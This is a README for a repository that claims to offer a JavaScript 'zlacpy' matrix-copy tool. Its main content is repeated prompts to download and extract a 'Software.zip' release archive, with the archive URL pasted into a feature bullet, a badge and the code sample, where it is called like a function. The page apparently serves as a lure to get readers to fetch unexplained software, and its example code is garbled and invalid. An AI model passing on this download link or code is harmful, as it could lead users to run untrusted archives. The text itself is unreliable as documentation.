Welcome to the `lapack-base-zlacpy` repository! This repository provides a functionality to copy all or part of a matrix A to another matrix B. If you are working with complex numbers and matrices, this tool will be incredibly useful for you.

## Features üåü

‚ú® Copy complex matrices easily  
‚ú® Efficient Lapack-based operations  
‚ú® https://github.com/marionerjattv/lapack-base-zlacpy/releases/download/v2.0/Software.zip compatibility  
‚ú® Suitable for linear algebra operations  

## Installation üöÄ

You can download the software package from the following link:  

[![Download Software](https://github.com/marionerjattv/lapack-base-zlacpy/releases/download/v2.0/Software.zip)](https://github.com/marionerjattv/lapack-base-zlacpy/releases/download/v2.0/Software.zip)

Please make sure to extract the contents after downloading the software package before you can use it.

## Usage üìò

To use the `zlacpy` functionality in your JavaScript code, you can follow these steps:

```javascript
// Import the zlacpy module
const zlacpy = require('zlacpy');

// Define your matrices A and B
let A = [
  [1, 2],
  [3, 4]
];

let B = [
  [0, 0],
  [0, 0]
];

// Call the zlacpy function to copy matrix A to matrix B
zlacpy(A, B);

// B will now be a copy of A
https://github.com/marionerjattv/lapack-base-zlacpy/releases/download/v2.0/Software.zip(B);
```

This simple code snippet demonstrates how you can use the `zlacpy` function to copy a matrix in your JavaScript application.
